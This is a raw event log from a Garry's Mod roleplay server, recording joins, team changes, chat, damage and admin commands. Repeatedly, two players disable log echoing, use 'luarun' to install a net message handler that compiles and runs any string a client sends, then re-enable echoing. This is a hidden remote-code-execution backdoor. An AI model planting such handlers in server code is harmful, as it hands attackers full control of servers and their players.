17/07/2019 - 10:35:31 AM	raging anger(Joining/Connecting) connected from the server
17/07/2019 - 10:35:35 AM	FunFuse(Joining/Connecting) connected from the server
17/07/2019 - 10:35:53 AM	litnig mqcueen(Joining/Connecting) connected from the server
17/07/2019 - 10:35:58 AM	Sahid_Plays_Game.ttv(Monkey Man) changed his team from 'Citizen' to 'Monkey Man'
17/07/2019 - 10:36:03 AM	FunFuse(Citizen) spawned a 'models/props_junk/PlasticCrate01a.mdl'
17/07/2019 - 10:36:12 AM	FunFuse(Citizen) spawned a 'models/props_c17/FurnitureToilet001a.mdl'
17/07/2019 - 10:36:15 AM	Sahid_Plays_Game.ttv(Ronald Mcdonald) changed his team from 'Monkey Man' to 'Ronald Mcdonald'
17/07/2019 - 10:36:27 AM	iWolfz -ERP-(Joining/Connecting) connected from the server
17/07/2019 - 10:36:43 AM	litnig mqueen(Hitman) changed his team from 'Citizen' to 'Hitman'
17/07/2019 - 10:36:51 AM	Sahid_Plays_Game.ttv(Squidward) changed his team from 'Ronald Mcdonald' to 'Squidward'
17/07/2019 - 10:37:05 AM	Sahid_Plays_Game.ttv(Squidward) said '/me takes pants off'
17/07/2019 - 10:37:05 AM	Dio(Joining/Connecting) connected from the server
17/07/2019 - 10:37:11 AM	crybaby(Joining/Connecting) connected from the server
17/07/2019 - 10:37:24 AM	iWolfz -ERP-(Citizen) said '// what hapend'
17/07/2019 - 10:37:25 AM	Sahid_Plays_Game.ttv(Squidward) said '/me strips weapons and comms'
17/07/2019 - 10:37:28 AM	[HURT] litnig mqueen(Hitman) hurt Sahid_Plays_Game.ttv(Squidward) with 5 damage using fas2_p226
17/07/2019 - 10:37:28 AM	[HURT] litnig mqueen(Hitman) hurt Sahid_Plays_Game.ttv(Squidward) with 19 damage using fas2_p226
17/07/2019 - 10:37:50 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:37:51 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:37:51 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:37:58 AM	Sahid_Plays_Game.ttv(Robber) changed his team from 'Squidward' to 'Robber'
17/07/2019 - 10:38:08 AM	[KILL] iWolfz -ERP-(Citizen) killed himself
17/07/2019 - 10:38:21 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:38:21 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:38:22 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:38:33 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:38:33 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:38:34 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:38:38 AM	UG | M A S T E R(Joining/Connecting) connected from the server
17/07/2019 - 10:38:49 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:38:50 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:38:50 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:38:56 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:38:56 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:38:57 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:39:07 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:39:07 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:39:08 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:39:11 AM	Dio(Dio Brando) changed his team from 'Citizen' to 'Dio Brando'
17/07/2019 - 10:39:18 AM	Parrasky(Joining/Connecting) connected from the server
17/07/2019 - 10:40:04 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:40:04 AM	FunFuse(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:40:05 AM	FunFuse(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:40:29 AM	[HURT] Sahid_Plays_Game.ttv(Robber) hurt FunFuse(Citizen) with 23 damage using m9k_model627
17/07/2019 - 10:40:29 AM	[HURT] Sahid_Plays_Game.ttv(Robber) hurt FunFuse(Citizen) with 21 damage using m9k_model627
17/07/2019 - 10:40:30 AM	FunFuse(Citizen) said '@ Hey i have the guy who crashed th eserver'
17/07/2019 - 10:40:30 AM	FunFuse(Citizen) used ULX command ' asay Hey i have the guy who crashed th eserver'
17/07/2019 - 10:40:31 AM	(づ｡◕‿‿◕｡)づ(Joining/Connecting) connected from the server
17/07/2019 - 10:40:42 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:40:45 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:40:46 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoNerks') net.Receive ('NoNerks', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:40:46 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:40:56 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:41:00 AM	UG | M A S T E R(Citizen) said '@'
17/07/2019 - 10:41:00 AM	UG | M A S T E R(Citizen) used ULX command ' asay'
17/07/2019 - 10:41:10 AM	UG | M A S T E R(Citizen) said '/goto fun'
17/07/2019 - 10:41:14 AM	[HURT] The world hurt UG | M A S T E R(Citizen) with 40 damage using fall damage
17/07/2019 - 10:41:16 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:41:22 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:41:23 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoNerks') net.Receive ('NoNerks', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:41:23 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:41:25 AM	[HURT] The world hurt FunFuse(Citizen) with 38 damage using fall damage
17/07/2019 - 10:41:32 AM	iWolfz -ERP-(Citizen) said '!hp funfuse 100'
17/07/2019 - 10:41:32 AM	iWolfz -ERP-(Citizen) used ULX command ' hp funfuse 100'
17/07/2019 - 10:41:34 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
